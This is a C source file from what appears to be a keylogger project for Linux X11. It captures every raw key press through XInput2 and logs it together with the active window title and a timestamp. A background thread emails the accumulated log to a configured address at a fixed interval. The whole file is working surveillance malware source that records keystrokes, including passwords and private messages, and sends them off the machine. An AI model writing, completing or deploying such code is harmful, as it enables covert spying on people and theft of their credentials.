#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sys/select.h>
#include <stdatomic.h>
#include <X11/XKBlib.h>
#include <X11/extensions/XInput2.h>
#include "utils/time_utils.h"
#include "keylogger/utils/buffer.h"
#include "keylogger/utils/key_names.h"
#include "keylogger/utils/active_window.h"
#include "keylogger/keylogger.h"
#include "core_state.h"

#define KEY_BUFFER_SIZE 64
#ifndef DURATION
#error "DURATION is not defined"
#endif

pthread_mutex_t file_mutex = PTHREAD_MUTEX_INITIALIZER;
_Atomic int new_current_window = 1;

void *read_keyboard(void *arg) {
    KeyloggerContext *context = (KeyloggerContext*) arg;
    char key[KEY_BUFFER_SIZE];
    int write_error;
    BufferText buffer;

    if (buffer_text_init(&buffer)) pthread_exit((void *)1);

    while (!exit_flag) {
        XEvent event;
        XGenericEventCookie *cookie;
        if (XPending(context->input_handler.display)){
            cookie = (XGenericEventCookie*)&event.xcookie;
            XNextEvent(context->input_handler.display, &event);
        } else {
            usleep(1000);
            continue;
        }

        if (XGetEventData(context->input_handler.display, cookie)) {
            if ((cookie->type == GenericEvent &&
                cookie->extension == context->input_handler.xi_opcode) &&
                cookie->evtype == XI_RawKeyPress) {

                XkbStateRec state;
                XkbGetState(context->input_handler.display, XkbUseCoreKbd, &state);
                XIRawEvent *ev = cookie->data;
                KeySym sym;
                unsigned int full_state = state.mods | (state.group << 13);
                unsigned consumed_mods;

                if (atomic_load(&new_current_window)) {
                    char* current_window;
                    char time_str[9];
                    char f_str[512];
                    if (!get_active_window(context->input_handler.display, &current_window)){
                        atomic_store(&new_current_window, 0);
                        get_current_time(time_str, sizeof(time_str));
                        snprintf(f_str, sizeof(f_str), "\n\n[%s] %s\n", time_str, current_window);
                        free(current_window);
                        write_error = write_or_buffer_event(&(context->log_file), &buffer, f_str, &file_mutex);
                        if (write_error){
                            buffer_text_clear(&buffer);
                            pthread_exit((void *)1);
                        }
                    }
                }

                if (XkbLookupKeySym(context->input_handler.display, ev->detail, full_state, &consumed_mods, &sym)) {
                    if (!get_key_string((xkb_keysym_t)sym, key, sizeof(key))) {
                        write_error = write_or_buffer_event(&(context->log_file), &buffer, key, &file_mutex);
                        if (write_error){
                            buffer_text_clear(&buffer);
                            pthread_exit((void *)1);
                        }
                    }
                }
            }
            XFreeEventData(context->input_handler.display, cookie);
        } else if (event.type == PropertyNotify){
            XPropertyEvent *prop_event = (XPropertyEvent *)&event;
            if (prop_event->atom == context->input_handler.net_active_window_atom) atomic_store(&new_current_window, 1);
        }
    }
    buffer_text_clear(&buffer);
    pthread_exit((void *)0);
}

void *send_email(void *arg){
    KeyloggerContext *context = (KeyloggerContext*) arg;
    while (!exit_flag){
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(pipe_fd_email[0], &read_fds);

        struct timeval tv;
        tv.tv_sec = DURATION * 60;
        tv.tv_usec = 0;

        int select_result = select(pipe_fd_email[0] + 1, &read_fds, NULL, NULL, &tv);
        if (select_result > 0){
            char buffer[10];
            read(pipe_fd_email[0], buffer, sizeof(buffer));
            continue;
        } else if (select_result == 0){
            atomic_store(&new_current_window, 1);
            pthread_mutex_lock(&file_mutex);
            send_file_via_email(&(context->sender), &(context->log_file));
            pthread_mutex_unlock(&file_mutex);
        } else {
            if (errno == EINTR) continue;
            fprintf(stderr, "Select error: %s\n", strerror(errno));
            pthread_exit((void *)1);
        }
    }
    pthread_exit((void *)0);
}

int context_init(KeyloggerContext *context){
    int error = 0;
    error = Logfile_init(&(context->log_file));
    error = InputHandler_init(&(context->input_handler)) || error;
    error = EmailSender_init(&(context->sender)) || error;
    return error;
}

void context_cleanup(KeyloggerContext *context){
    Logfile_close(&(context->log_file));
    InputHandler_cleanup(&(context->input_handler));
    EmailSender_cleanup(&(context->sender));
}
